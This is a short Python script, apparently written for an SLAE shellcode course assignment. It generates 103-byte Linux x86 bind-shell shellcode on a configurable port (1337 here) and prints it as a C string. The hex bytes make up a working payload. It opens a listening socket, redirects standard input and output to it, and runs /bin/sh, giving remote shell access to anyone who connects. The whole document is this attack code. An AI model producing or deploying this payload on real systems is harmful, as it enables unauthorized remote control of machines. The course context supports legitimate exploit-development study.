#!/usr/bin/env python

# Shell Bind TCP (103 bytes) Generator
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-1-shell-bind-tcp-linux-x86/

import struct

port = 1337
sc = ("\x31\xc0\x50\xb0\x66\x6a\x01\x8b\x1c\x24\x6a\x02\x89\xe1\xcd\x80\x89"
      "\xc6\x31\xd2\x52\x66\x68"+struct.pack("!H",port)+"\x66\x6a\x02\x89\xe1"
      "\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\x50\xb0\x66\xb3\x04"
      "\x56\x89\xe1\xcd\x80\x31\xc0\x50\x50\xb0\x66\x6a\x05\x5b\x56\x89\xe1"
      "\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\xb0"
      "\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52"
      "\x53\x89\xe1\xcd\x80")

print '"' + ''.join('\\x%02x' % ord(c) for c in sc) + '";'
